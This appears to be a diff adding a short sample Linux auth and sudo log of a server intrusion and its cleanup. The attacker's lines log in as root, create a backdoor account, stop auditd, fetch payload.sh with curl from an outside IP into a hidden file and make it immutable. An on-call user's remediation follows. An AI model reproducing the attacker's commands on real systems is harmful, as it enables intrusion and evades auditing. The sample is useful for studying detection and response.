@@ -1,0 +1,25 @@
+Apr 23 02:14:08 webserver-prod-21 sshd[81001]: Accepted password for root from 45.123.45.67 port 51122 ssh2
+Apr 23 02:14:08 webserver-prod-21 sshd[81001]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Apr 23 02:15:42 webserver-prod-21 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -u 1050 sysd
+Apr 23 02:16:05 webserver-prod-21 useradd[81025]: new user: name=sysd, UID=1050, GID=1050, home=/home/sysd, shell=/bin/bash
+Apr 23 02:16:47 webserver-prod-21 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/systemctl stop auditd
+Apr 23 02:17:02 webserver-prod-21 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x https://185.177.124.22/payload.sh
+Apr 23 02:17:22 webserver-prod-21 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chattr +i /tmp/.x
+Apr 23 02:17:35 webserver-prod-21 sshd[81001]: pam_unix(sshd:session): session closed for user root
+Apr 23 02:42:11 webserver-prod-21 sshd[81205]: Accepted publickey for alice from 10.0.2.15 port 45000 ssh2: ED25519 SHA256:aliceOncall
+Apr 23 02:42:11 webserver-prod-21 sshd[81205]: pam_unix(sshd:session): session opened for user alice(uid=1002) by (uid=0)
+Apr 23 02:42:18 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/last -n 20
+Apr 23 02:42:45 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/auth.log
+Apr 23 02:43:17 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/systemctl start auditd
+Apr 23 02:43:30 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/chattr -i /tmp/.x
+Apr 23 02:43:42 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/rm /tmp/.x
+Apr 23 02:44:01 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/userdel -r sysd
+Apr 23 02:44:01 webserver-prod-21 userdel[81302]: delete user 'sysd'
+Apr 23 02:44:01 webserver-prod-21 userdel[81302]: removed group 'sysd' owned by 'sysd'
+Apr 23 02:44:27 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/passwd root
+Apr 23 02:44:42 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/vi /etc/ssh/sshd_config
+Apr 23 02:45:31 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/systemctl restart sshd
+Apr 23 02:46:18 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/iptables -I INPUT -s 45.123.45.67 -j DROP
+Apr 23 02:47:05 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cp /etc/shadow /root/incident-response/shadow.snapshot.txt
+Apr 23 02:48:42 webserver-prod-21 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/tar -czf /root/incident-response/artifact-bundle.tar.gz /etc /var/log
+Apr 23 02:55:18 webserver-prod-21 sshd[81205]: pam_unix(sshd:session): session closed for user alice
